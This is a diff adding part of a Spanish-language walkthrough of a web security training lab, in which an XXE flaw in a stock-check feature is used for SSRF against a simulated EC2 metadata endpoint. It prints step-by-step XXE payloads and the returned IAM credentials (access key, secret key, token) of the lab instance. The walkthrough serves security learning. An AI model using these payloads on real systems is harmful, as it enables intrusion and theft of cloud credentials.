@@ -42,3 +42,66 @@ Ahora, vamos al home para verificar que completamos el laboratorio.
 
 ## 2. Lab: Exploiting XXE to perform SSRF attacks
 
+```
+Este laboratorio tiene una función "Check stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.
+
+El servidor de laboratorio está ejecutando un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. Este punto final se puede utilizar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales.
+
+Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga el secret access key de IAM del servidor desde el punto final de metadatos EC2.
+```
+
+Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.
+
+![](img4.png)
+
+Entonces ahora debemos generar un payload para el ataque, el cual será el siguiente basandonos en la estructura del XML del paquete:
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+Y enviamos el paquete, observamos lo siguiente:
+
+![](img5.png)
+
+Recibimos como respuesta el string **latest**, lo agregamos a la url de la ip a la que queremos acceder y obtenemos la siguiente respuesta:
+
+```
+PAYLOAD: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+RESPUESTA: "Invalid product ID: meta-data"
+```
+
+Y volvemos a agregar la respuesta en la url del payload y obtenemos la siguiente respuesta:
+
+```
+"Invalid product ID: iam"
+```
+
+Y seguimos agregando todos los que nos sugiere hasta tener el siguiente payload.
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+El cual nos devuelve la siguiente respuesta:
+
+![](img6.png)
+
+```
+"Invalid product ID: {
+  "Code" : "Success",
+  "LastUpdated" : "2021-02-07T16:07:36.536751Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "mxjF9Xea2bZ9FpdxtCCU",
+  "SecretAccessKey" : "wORR4gS3GaX0QzbXqFs7qAk7AyQkFvzYCVc48DDx",
+  "Token" : "jy7FOMsOs523ituXLzFHQKLJsNYKdRfrCxkJFWJOqW6e9INmJ9fyn8dGi3olUWxkfkSXLdIuCFRdB6K03D56Rnrq0XYBSYqGrNt4gulNlfrSkMSxzsBwl8bzPSTXI2lTVjYAFgXbeB1U1VBPIiW243nEzoqsmUi4Zs8ZhqAqIsQ6hoZ30EMhrtbFxFNzdZMssvglji6r4CbsPxBxDb4yseYBZ3nLBUXEFIG47pXmQCwlXMfnLzKcRkBCRHSl2Dg2",
+  "Expiration" : "2027-02-06T16:07:36.536751Z"
+}"
+```
+
+Y los que nos piden es el **secret access key** el cual sería **wORR4gS3GaX0QzbXqFs7qAk7AyQkFvzYCVc48DDx**. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.
+
+![](img7.png)
+
+## 3. Lab: Blind XXE with out-of-band interaction
+
